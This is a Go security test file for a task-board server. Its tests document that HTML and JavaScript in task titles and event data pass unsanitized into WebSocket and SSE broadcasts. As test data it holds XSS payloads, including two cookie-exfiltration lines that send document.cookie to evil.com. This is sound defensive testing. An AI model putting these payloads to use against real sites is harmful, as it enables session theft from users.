package security_test

// Cross-layer input sanitization security tests.
//
// These tests verify that malicious input flowing from HTTP handlers through
// converters into WebSocket/SSE broadcast does not bypass sanitization at any
// layer boundary.

import (
	"encoding/json"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"

	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/JLugagne/agach-mcp/internal/pkg/sse"
	"github.com/JLugagne/agach-mcp/internal/pkg/websocket"
	"github.com/JLugagne/agach-mcp/internal/server/domain"
	"github.com/JLugagne/agach-mcp/internal/server/inbound/converters"
)

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 1: XSS payloads in task titles survive through converters to WebSocket
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_XSSInTaskTitleToWebSocket documents that task titles
// containing HTML/JavaScript payloads pass through the converter layer and are
// broadcast verbatim over WebSocket. The frontend must handle escaping, but a
// defense-in-depth approach should sanitize at the API boundary.
//
// Affected:
//   - internal/server/inbound/converters/tasks.go:ToPublicTask (no title sanitization)
//   - internal/server/inbound/commands/tasks.go:98-102 (broadcasts ToPublicTask directly)
//   - internal/pkg/websocket/hub.go:Broadcast (no payload sanitization)
//
// TODO(security): Sanitize or reject HTML in task titles at the handler or
// converter layer. The validator only checks required/max length, not content.
func TestIntegration_RED_XSSInTaskTitleToWebSocket(t *testing.T) {
	t.Log("RED: XSS payloads in task titles pass through converters to WebSocket broadcast unescaped")

	xssPayloads := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert(1)>`,
		`"><svg onload=alert(1)>`,
		"javascript:alert(document.cookie)",
	}

	for _, payload := range xssPayloads {
		t.Run(payload, func(t *testing.T) {
			task := domain.Task{
				ID:       domain.NewTaskID(),
				ColumnID: domain.NewColumnID(),
				Title:    payload,
				Summary:  "safe summary",
			}

			// Convert to public type (this is what gets broadcast)
			public := converters.ToPublicTask(task)

			// The title should be sanitized, but it passes through unchanged
			assert.Equal(t, payload, public.Title,
				"RED: XSS payload in title survives converter (if different, sanitization may have been added)")

			// Verify it also survives JSON encoding (what WebSocket sends).
			// Note: json.Marshal escapes < and > to \u003c / \u003e, but the
			// payload is still present and will be decoded by the client.
			data, err := json.Marshal(public)
			require.NoError(t, err)

			// Decode back to verify round-trip preserves the payload
			var decoded map[string]interface{}
			require.NoError(t, json.Unmarshal(data, &decoded))
			assert.Equal(t, payload, decoded["title"],
				"RED: XSS payload survives JSON round-trip in WebSocket message")
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 2: XSS in task fields broadcast via WebSocket event data maps
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_XSSInWebSocketEventDataMaps documents that several command
// handlers broadcast task data in raw map[string]string values that include
// user-controlled content (completion_summary, blocked_reason, wont_do_reason)
// without sanitization.
//
// Affected:
//   - internal/server/inbound/commands/tasks.go:344-351 (task_completed: completion_summary)
//   - internal/server/inbound/commands/tasks.go:389-396 (task_moved: reason)
//   - internal/server/inbound/commands/tasks.go:461-467 (task_wont_do: reason)
//
// TODO(security): Sanitize user-controlled fields before including them in
// broadcast event data, or use structured types instead of raw maps.
func TestIntegration_RED_XSSInWebSocketEventDataMaps(t *testing.T) {
	t.Log("RED: User-controlled fields in WebSocket event data maps are not sanitized")

	xssReason := `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`

	// Simulate building the event data that tasks.go creates
	eventData := map[string]interface{}{
		"task_id":            "some-task-id",
		"completion_summary": xssReason,
		"files_modified":     []string{"main.go"},
		"completed_by_agent": "agent-1",
	}

	data, err := json.Marshal(eventData)
	require.NoError(t, err)

	assert.Contains(t, string(data), "onerror",
		"RED: XSS payload in event data map survives JSON encoding without sanitization")
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 3: SSE payload sanitization only strips newlines, not HTML
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_SSEPayloadHTMLNotSanitized documents that the SSE hub's
// sanitize function only removes newlines to prevent event boundary injection,
// but does NOT strip HTML/JavaScript content from the payload.
//
// Affected:
//   - internal/pkg/sse/hub.go:94-102 (sanitize: only strips \n and \r)
//   - internal/server/inbound/commands/tasks.go:106-115 (publishes task title in SSE)
//
// TODO(security): SSE payloads should also escape or strip HTML since they
// may be rendered in the browser via EventSource API.
func TestIntegration_RED_SSEPayloadHTMLNotSanitized(t *testing.T) {
	t.Log("RED: SSE hub sanitize() only strips newlines, not HTML content")

	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)
	hub := sse.NewHub(logger)

	ch, unsub := hub.Subscribe("test-project")
	defer unsub()
	require.NotNil(t, ch)

	// Publish a payload with XSS content (but no newlines, so sanitize() is a no-op)
	xssPayload := `{"id":"x","title":"<script>alert(1)</script>","role":"dev"}`
	hub.Publish("test-project", xssPayload)

	select {
	case received := <-ch:
		assert.Contains(t, received, "<script>",
			"RED: SSE hub delivers HTML payloads unescaped (if different, HTML sanitization may have been added)")
	default:
		t.Fatal("expected to receive SSE message")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 4: No content validation on search query parameter
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_SearchQueryNoContentValidation documents that the search
// query parameter is passed through to the database layer without content
// validation or length limiting beyond the general maxSearchLimit on results.
//
// Affected:
//   - internal/server/inbound/queries/tasks.go:54 (filters.Search = q, no sanitization)
//   - internal/server/inbound/queries/tasks.go:106 (filters.Search = search)
//   - internal/server/inbound/queries/tasks.go:177 (searchQuery from URL)
//
// The underlying PostgreSQL query likely uses parameterized queries (pgx), so
// SQL injection is prevented. However, excessively long search strings or
// wildcard abuse (e.g., %_%_%_%) could cause performance issues.
//
// TODO(security): Add length limit and content validation on search queries.
func TestIntegration_RED_SearchQueryNoContentValidation(t *testing.T) {
	t.Log("RED: Search query parameter has no content validation or length limit")

	// Parse the task queries handler to confirm search is used without validation
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "../server/inbound/queries/tasks.go", nil, 0)
	require.NoError(t, err)

	// Look for search assignment without length check
	searchAssignments := 0
	searchLengthChecks := 0

	ast.Inspect(f, func(n ast.Node) bool {
		assign, ok := n.(*ast.AssignStmt)
		if !ok {
			return true
		}

		for _, lhs := range assign.Lhs {
			sel, ok := lhs.(*ast.SelectorExpr)
			if !ok {
				continue
			}
			if sel.Sel.Name == "Search" {
				searchAssignments++
			}
		}
		return true
	})

	// Check if there's a len() check near search assignments
	ast.Inspect(f, func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		if !ok {
			return true
		}
		ident, ok := call.Fun.(*ast.Ident)
		if !ok {
			return true
		}
		if ident.Name == "len" && len(call.Args) == 1 {
			// Check if the arg references search/Search/searchQuery
			if ident, ok := call.Args[0].(*ast.Ident); ok {
				if strings.Contains(strings.ToLower(ident.Name), "search") {
					searchLengthChecks++
				}
			}
		}
		return true
	})

	assert.Greater(t, searchAssignments, 0,
		"handler should assign search query to filters")
	assert.Equal(t, 0, searchLengthChecks,
		"RED: no length validation on search query (if >0, validation may have been added)")
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 5: Unicode normalization bypass on slug validation
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_UnicodeNormalizationSlugBypass documents that the custom
// "slug" validator in controller.go checks bytes individually for ASCII lowercase
// alphanumeric + hyphens + underscores, but does not normalize Unicode first.
// Certain Unicode characters (e.g., fullwidth ASCII) could potentially bypass
// other validators or cause confusion in downstream systems.
//
// Affected:
//   - internal/pkg/controller/controller.go:32-43 (slug validator: byte-level ASCII check)
//
// TODO(security): Apply Unicode normalization (NFKC) before validation, or
// explicitly reject any non-ASCII input at the API boundary.
func TestIntegration_RED_UnicodeNormalizationSlugBypass(t *testing.T) {
	t.Log("RED: Slug validator does not apply Unicode normalization")

	// The slug validator correctly rejects non-ASCII, but the broader concern
	// is that other string fields (titles, descriptions) don't normalize Unicode,
	// meaning visually identical strings could create confusion.

	// Verify the slug validator itself is safe for its purpose
	// (This test documents the gap for other fields, not slug specifically)

	// Construct pairs of visually similar strings using different Unicode representations
	testCases := []struct {
		name  string
		input string // Non-normalized input
	}{
		{"fullwidth a", "\uff41\uff42\uff43"}, // fullwidth abc
		{"combining accent", "e\u0301"},        // e + combining acute = e with accent
		{"zero-width joiner", "ab\u200dc"},      // invisible character between b and c
		{"right-to-left override", "\u202eterces"}, // RTL override
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// These would be task titles or descriptions. The converter passes
			// them through unchanged, meaning they reach the database and
			// WebSocket broadcast without normalization.
			task := domain.Task{
				ID:       domain.NewTaskID(),
				ColumnID: domain.NewColumnID(),
				Title:    tc.input,
				Summary:  "test",
			}

			public := converters.ToPublicTask(task)
			assert.Equal(t, tc.input, public.Title,
				"RED: Unicode input passes through converter without normalization")
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Vuln 6: WebSocket broadcast does not sanitize Event.Data
// ─────────────────────────────────────────────────────────────────────────────

// TestIntegration_RED_WebSocketBroadcastNoDataSanitization documents that the
// WebSocket hub broadcasts Event.Data as-is through JSON encoding, with no
// sanitization layer. Since handlers put user-controlled data in Event.Data,
// malicious content reaches all connected clients.
//
// Affected:
//   - internal/pkg/websocket/hub.go:178-183 (Broadcast: no sanitization)
//   - internal/pkg/websocket/hub.go:117-130 (Run: broadcasts to all matching clients)
//
// TODO(security): Add a sanitization hook or structured event type that
// validates data before broadcast.
func TestIntegration_RED_WebSocketBroadcastNoDataSanitization(t *testing.T) {
	t.Log("RED: WebSocket hub broadcasts Event.Data without sanitization")

	// Construct an event with malicious data
	event := websocket.Event{
		Type:      "task_updated",
		ProjectID: "project-1",
		Data: map[string]string{
			"task_id": "valid-id",
			"title":   `<script>document.location='https://evil.com/?c='+document.cookie</script>`,
		},
	}

	// JSON-encode it (this is what the hub does before sending)
	data, err := json.Marshal(event)
	require.NoError(t, err)

	assert.Contains(t, string(data), "document.cookie",
		"RED: malicious content in Event.Data survives JSON encoding")
}
